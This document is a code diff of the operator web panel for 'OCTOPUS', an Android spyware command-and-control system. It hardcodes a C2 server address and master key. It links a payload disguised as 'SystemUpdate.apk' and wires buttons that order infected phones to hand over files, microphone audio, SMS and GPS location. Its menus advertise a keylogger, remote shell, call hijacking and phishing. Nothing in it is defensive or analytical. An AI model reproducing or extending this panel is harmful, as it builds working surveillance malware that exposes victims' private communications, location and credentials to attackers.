@@ -3,59 +3,102 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OCTOPUS | ELITE C2</title>
+    <title>OCTOPUS | COMMAND CENTER</title>
     <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Inter:wght@300;500;700&display=swap');
+        /* High-End Tech Fonts */
+        @import url('https://fonts.googleapis.com/css2?family=Syne:wght@700;800&family=JetBrains+Mono:wght@300;500&display=swap');
         
-        :root { --red: #ff1a1a; --bg: #050505; --panel: #0d0d0d; --hover: #1a1a1a; --text-dim: #888; }
+        :root { 
+            --red: #ff1a1a; 
+            --bg: #020202; 
+            --panel: #080808; 
+            --border: #151515;
+            --font-main: 'JetBrains Mono', monospace;
+            --font-head: 'Syne', sans-serif;
+        }
         
-        * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { background: var(--bg); color: #fff; font-family: 'Inter', sans-serif; display: flex; height: 100vh; overflow: hidden; }
+        * { box-sizing: border-box; margin: 0; padding: 0; outline: none; }
 
-        /* Login */
-        #login-overlay { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; justify-content: center; align-items: center; }
-        .login-card { width: 380px; padding: 40px; background: var(--panel); border-top: 4px solid var(--red); text-align: center; }
-        .login-card input { width: 100%; padding: 15px; margin: 20px 0; background: #000; border: 1px solid #222; color: var(--red); text-align: center; font-family: 'Orbitron'; }
-        .login-btn { width: 100%; padding: 15px; background: var(--red); border: none; color: #fff; font-family: 'Orbitron'; cursor: pointer; }
+        /* Custom Elite Scrollbar */
+        ::-webkit-scrollbar { width: 4px; }
+        ::-webkit-scrollbar-track { background: #000; }
+        ::-webkit-scrollbar-thumb { background: var(--red); border-radius: 10px; box-shadow: 0 0 10px var(--red); }
 
-        /* Sidebar - Akatsuki Style */
-        nav { width: 260px; background: var(--panel); display: flex; flex-direction: column; border-right: 1px solid #111; overflow-y: auto; flex-shrink: 0; }
-        .brand-box { padding: 30px; text-align: center; }
-        .brand-box h1 { font-family: 'Orbitron'; color: var(--red); font-size: 22px; letter-spacing: 3px; }
+        body { 
+            background: var(--bg); 
+            color: #fff; 
+            font-family: var(--font-main); 
+            display: flex; 
+            height: 100vh; 
+            overflow: hidden; 
+        }
+
+        /* Minimal Tech Login */
+        #login-overlay { 
+            position: fixed; inset: 0; background: #000; z-index: 9999; 
+            display: flex; justify-content: center; align-items: center; 
+        }
+        .login-wrap { width: 320px; text-align: center; }
+        .login-wrap h1 { font-family: var(--font-head); font-size: 28px; color: var(--red); letter-spacing: -1px; margin-bottom: 5px; }
+        .login-wrap p { font-size: 10px; color: #444; margin-bottom: 30px; text-transform: uppercase; letter-spacing: 2px; }
+        .login-input { 
+            width: 100%; padding: 15px; background: transparent; border: none; 
+            border-bottom: 2px solid #222; color: var(--red); text-align: center; 
+            font-family: var(--font-main); font-size: 16px; transition: 0.4s;
+        }
+        .login-input:focus { border-bottom-color: var(--red); }
+        .login-btn { 
+            margin-top: 30px; background: transparent; color: #fff; border: 1px solid #333; 
+            padding: 10px 25px; cursor: pointer; font-family: var(--font-head); font-size: 11px;
+            transition: 0.3s;
+        }
+        .login-btn:hover { background: var(--red); border-color: var(--red); box-shadow: 0 0 15px var(--red); }
+
+        /* Sidebar Navigation */
+        nav { 
+            width: 280px; background: var(--panel); border-right: 1px solid var(--border); 
+            display: flex; flex-direction: column; padding: 40px 0; 
+        }
+        .brand { padding: 0 40px 40px 40px; font-family: var(--font-head); font-size: 22px; color: var(--red); }
         
-        .nav-group { flex: 1; }
-        .nav-item { padding: 15px 25px; display: flex; align-items: center; color: var(--text-dim); text-decoration: none; font-size: 13px; transition: 0.2s; cursor: pointer; border-left: 4px solid transparent; }
-        .nav-item i { width: 25px; font-size: 16px; margin-right: 15px; }
-        .nav-item:hover, .nav-item.active { background: var(--hover); color: #fff; border-left-color: var(--red); }
+        .nav-item { 
+            padding: 16px 40px; display: flex; align-items: center; color: #555; 
+            text-decoration: none; font-size: 12px; font-weight: 500; cursor: pointer; 
+            transition: 0.2s; border-left: 3px solid transparent;
+        }
+        .nav-item i { width: 25px; font-size: 14px; margin-right: 15px; }
+        .nav-item:hover, .nav-item.active { color: #fff; background: #0c0c0c; border-left-color: var(--red); }
+
+        /* Main Workspace */
+        main { flex: 1; display: flex; flex-direction: column; }
+        header { 
+            height: 80px; border-bottom: 1px solid var(--border); 
+            display: flex; align-items: center; justify-content: space-between; 
+            padding: 0 50px; background: #030303; 
+        }
+        .view-name { font-family: var(--font-head); font-size: 14px; color: #fff; text-transform: uppercase; }
         
-        /* Main View */
-        main { flex: 1; display: flex; flex-direction: column; background: #000; }
-        header { height: 70px; border-bottom: 1px solid #111; display: flex; align-items: center; justify-content: space-between; padding: 0 40px; background: var(--panel); }
-        .view-title { font-family: 'Orbitron'; font-size: 14px; color: var(--red); }
-        
-        .content-area { flex: 1; padding: 40px; overflow-y: auto; }
-        #target-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 25px; }
+        .content { flex: 1; padding: 50px; overflow-y: auto; }
+        #target-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(360px, 1fr)); gap: 30px; }
 
         /* Target Card */
-        .card { background: var(--panel); border: 1px solid #1a1a1a; padding: 25px; border-radius: 4px; }
-        .card-top { display: flex; justify-content: space-between; margin-bottom: 20px; }
-        .status-dot { height: 8px; width: 8px; border-radius: 50%; display: inline-block; background: #0f0; margin-right: 8px; }
-        .card-label { font-size: 10px; color: var(--text-dim); text-transform: uppercase; margin-bottom: 15px; display: block; border-bottom: 1px solid #111; padding-bottom: 5px; }
+        .card { background: #0a0a0a; border: 1px solid var(--border); border-radius: 12px; padding: 30px; }
+        .card-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; }
+        .target-name { font-family: var(--font-head); font-size: 16px; color: var(--red); }
         
-        .btn-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }
-        .action-btn { background: #111; border: 1px solid #222; color: #fff; padding: 10px; font-size: 11px; cursor: pointer; display: flex; align-items: center; justify-content: center; }
-        .action-btn i { margin-right: 8px; font-size: 12px; }
-        .action-btn:hover { background: var(--red); border-color: var(--red); }
+        .btn-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+        .action-btn { 
+            background: #0d0d0d; border: 1px solid #1a1a1a; color: #888; 
+            padding: 12px; font-size: 11px; cursor: pointer; border-radius: 6px;
+            display: flex; align-items: center; justify-content: center; transition: 0.2s;
+        }
+        .action-btn i { margin-right: 10px; font-size: 12px; }
+        .action-btn:hover { background: #fff; color: #000; border-color: #fff; }
 
-        /* Hidden Sections */
-        .hidden { display: none; }
-
-        /* Mobile */
         @media (max-width: 768px) {
-            nav { position: absolute; left: -100%; z-index: 10; height: 100%; transition: 0.3s; }
-            nav.open { left: 0; }
+            nav { display: none; }
             header { padding: 0 20px; }
         }
     </style>
@@ -63,83 +106,64 @@
 <body>
 
     <div id="login-overlay">
-        <div class="login-card">
-            <h1>OCTOPUS C2</h1>
-            <input type="password" id="pass" placeholder="MASTER KEY">
-            <button class="login-btn" onclick="login()">AUTHORIZE</button>
+        <div class="login-wrap">
+            <h1>OCTOPUS</h1>
+            <p>Master Control Interface</p>
+            <input type="password" id="pass" class="login-input" placeholder="ACCESS KEY" autofocus>
+            <button class="login-btn" onclick="login()">ESTABLISH LINK</button>
         </div>
     </div>
 
-    <nav id="sidebar">
-        <div class="brand-box"><h1>OCTOPUS</h1></div>
-        <div class="nav-group">
-            <div class="nav-item active" onclick="switchTab('Home')"><i class="fa-solid fa-house"></i> Home</div>
-            <div class="nav-item" onclick="switchTab('VNC')"><i class="fa-solid fa-desktop"></i> Hidden VNC</div>
-            <div class="nav-item" onclick="switchTab('Inject')"><i class="fa-solid fa-syringe"></i> Inject</div>
-            <div class="nav-item" onclick="switchTab('Phishing')"><i class="fa-solid fa-mask"></i> Phishing</div>
-            <div class="nav-item" onclick="switchTab('Identity')"><i class="fa-solid fa-user-shield"></i> Steal Identity</div>
-            <div class="nav-item" onclick="switchTab('Firewall')"><i class="fa-solid fa-shield-halved"></i> App Firewall</div>
-            <div class="nav-item" onclick="switchTab('Notifications')"><i class="fa-solid fa-bell"></i> Notifications</div>
-            <div class="nav-item" onclick="switchTab('Messages')"><i class="fa-solid fa-comment-dots"></i> Messages</div>
-            <div class="nav-item" onclick="switchTab('Calls')"><i class="fa-solid fa-phone-flip"></i> Call Forwarding</div>
-            <div class="nav-item" onclick="switchTab('Launch')"><i class="fa-solid fa-rocket"></i> Launch Intent</div>
-        </div>
-        <div class="nav-item" onclick="downloadApk()" style="color:var(--red)"><i class="fa-solid fa-download"></i> Build APK</div>
+    <nav>
+        <div class="brand">OCTOPUS</div>
+        <div class="nav-item active" onclick="tab('Live')"><i class="fa-solid fa-ghost"></i> Live Targets</div>
+        <div class="nav-item" onclick="tab('Files')"><i class="fa-solid fa-folder-open"></i> File Manager</div>
+        <div class="nav-item" onclick="tab('Shell')"><i class="fa-solid fa-terminal"></i> Remote Shell</div>
+        <div class="nav-item" onclick="tab('Keys')"><i class="fa-solid fa-keyboard"></i> Keylogger</div>
+        <div class="nav-item" onclick="tab('Spy')"><i class="fa-solid fa-eye"></i> Live Spy</div>
+        <div class="nav-item" onclick="tab('Sms')"><i class="fa-solid fa-message"></i> SMS Manager</div>
+        <div class="nav-item" onclick="tab('Calls')"><i class="fa-solid fa-phone"></i> Call Hijack</div>
+        <div class="nav-item" onclick="tab('Apps')"><i class="fa-solid fa-table-cells"></i> App Manager</div>
+        <div class="nav-item" onclick="tab('Guide')"><i class="fa-solid fa-book"></i> User Guide</div>
+        <div class="nav-item" onclick="download()" style="margin-top:auto; color:var(--red)"><i class="fa-solid fa-virus"></i> Build Payload</div>
     </nav>
 
     <main>
         <header>
-            <div class="view-title" id="active-title">HOME / LIVE TARGETS</div>
-            <div id="socket-status" style="font-size: 10px; color: #444;">DISCONNECTED</div>
+            <div class="view-name" id="view-title">LIVE_TARGETS</div>
+            <div id="status" style="font-size: 10px; color: #444; font-weight: 300;">C2_DISCONNECTED</div>
         </header>
 
-        <div class="content-area">
-            <div id="Home-view">
-                <div id="target-grid"></div>
-            </div>
-
-            <div id="generic-view" class="hidden">
-                <div style="padding: 40px; border: 1px dashed #222; color: #444; text-align: center;">
-                    MODULE INITIALIZING... CONNECT TARGET TO ACTIVATE.
-                </div>
-            </div>
+        <div class="content">
+            <div id="target-grid"></div>
         </div>
     </main>
 
     <script>
         let socket;
         const SERVER_URL = "http://51.68.234.157:20211";
-        const GITHUB_URL = "https://github.com/octopus29129/apkk/raw/main/SystemUpdate.apk";
 
         function login() {
             if(document.getElementById('pass').value === "octopus_xx1") {
-                document.getElementById('login-overlay').style.display = 'none';
-                initSocket();
-            } else { alert("ACCESS DENIED"); }
+                document.getElementById('login-overlay').style.opacity = '0';
+                setTimeout(() => document.getElementById('login-overlay').remove(), 400);
+                startC2();
+            } else { alert("KEY_ERROR: ACCESS DENIED"); }
         }
 
-        function switchTab(name) {
+        function tab(name) {
             document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
             event.currentTarget.classList.add('active');
-            document.getElementById('active-title').innerText = name.toUpperCase();
-            
-            if(name === 'Home') {
-                document.getElementById('Home-view').classList.remove('hidden');
-                document.getElementById('generic-view').classList.add('hidden');
-            } else {
-                document.getElementById('Home-view').classList.add('hidden');
-                document.getElementById('generic-view').classList.remove('hidden');
-            }
+            document.getElementById('view-title').innerText = name.toUpperCase() + "_VIEW";
         }
 
-        function downloadApk() { window.open(GITHUB_URL, '_blank'); }
+        function download() { window.open("https://github.com/octopus29129/apkk/raw/main/SystemUpdate.apk", '_blank'); }
 
-        function initSocket() {
+        function startC2() {
             socket = io(SERVER_URL, { query: { type: 'mastermind', key: 'octopus_xx1' } });
-            
             socket.on('connect', () => {
-                document.getElementById('socket-status').innerText = "CORE ONLINE";
-                document.getElementById('socket-status').style.color = "#0f0";
+                document.getElementById('status').innerText = "C2_CONNECTED // TUNNEL_ACTIVE";
+                document.getElementById('status').style.color = "#0f0";
             });
 
             socket.on('update_dashboard', (res) => {
@@ -152,32 +176,21 @@
                     grid.prepend(card);
                 }
                 card.innerHTML = `
-                    <div class="card-top">
-                        <div><span class="status-dot"></span><span style="font-size:12px">${res.data.model || 'Unknown Device'}</span></div>
-                        <div style="font-size:10px; color:#444">${res.id}</div>
+                    <div class="card-header">
+                        <span class="target-name">${res.data.model || 'ANDROID_NODE'}</span>
+                        <span style="font-size:9px; color:#333;">${res.id}</span>
                     </div>
-                    
-                    <span class="card-label">Hijack Controls</span>
                     <div class="btn-grid">
-                        <button class="action-btn" onclick="send('${res.id}', 'vnc')"><i class="fa-solid fa-desktop"></i> VNC</button>
-                        <button class="action-btn" onclick="send('${res.id}', 'sms')"><i class="fa-solid fa-envelope"></i> SMS</button>
-                        <button class="action-btn" onclick="send('${res.id}', 'mic')"><i class="fa-solid fa-microphone"></i> MIC</button>
-                        <button class="action-btn" onclick="send('${res.id}', 'cam')"><i class="fa-solid fa-camera"></i> CAM</button>
-                    </div>
-
-                    <span class="card-label">Device Data</span>
-                    <div style="font-size:11px; color:#666">
-                        Android: ${res.data.ver || '12+'} <br>
-                        Location: ${res.data.loc || 'Fetching...'} <br>
-                        Battery: ${res.data.bat || '100%'}
+                        <button class="action-btn" onclick="send('${res.id}', 'browse')"><i class="fa-solid fa-folder"></i> FILES</button>
+                        <button class="action-btn" onclick="send('${res.id}', 'mic')"><i class="fa-solid fa-microphone"></i> AUDIO</button>
+                        <button class="action-btn" onclick="send('${res.id}', 'sms')"><i class="fa-solid fa-comment-dots"></i> SMS</button>
+                        <button class="action-btn" onclick="send('${res.id}', 'gps')"><i class="fa-solid fa-location-crosshairs"></i> GPS</button>
                     </div>
                 `;
             });
         }
 
-        function send(id, act) { 
-            socket.emit('run_action', { targetId: id, action: act });
-        }
+        function send(id, act) { socket.emit('run_action', { targetId: id, action: act }); }
     </script>
 </body>
 </html>
